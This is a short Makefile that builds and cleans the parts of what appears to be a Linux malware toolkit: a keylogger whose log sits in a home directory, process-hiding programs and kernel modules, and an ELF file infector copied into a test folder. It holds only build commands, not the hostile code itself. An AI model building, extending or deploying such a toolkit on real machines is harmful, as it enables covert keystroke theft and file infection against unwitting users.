all:
	cd ./hideProcess && make
	cd ./skeylogger && make
	cd ./ELFsrc && make
	cd ./test && make
	cd ./ProcessHider_Modules && make
	cp ./ELFsrc/infector ./test
hider:
	cd ./hideProcess && make
skl:
	cd ./skeylogger && make
elf:
	cd ./ELFsrc && make
test:
	cd ./test && make
hiderM:
	cd ./ProcessHider_Modules && make
	
clean:
	cd ./hideProcess && make clean
	cd ./skeylogger && make clean
	cd ./ELFsrc && make clean
	cd ./test && make clean
	cd ./ProcessHider_Modules && make clean
	cd /home/sun && rm -rf skeylogger.log

cleanhider:
	cd ./hideProcess && make clean
cleanskl:	
	cd ./skeylogger && make clean
cleanelf:
	cd ./ELFsrc && make clean
cleantest:	
	cd ./test && make clean
cleanhiderM:
	cd ./ProcessHider_Modules && make clean
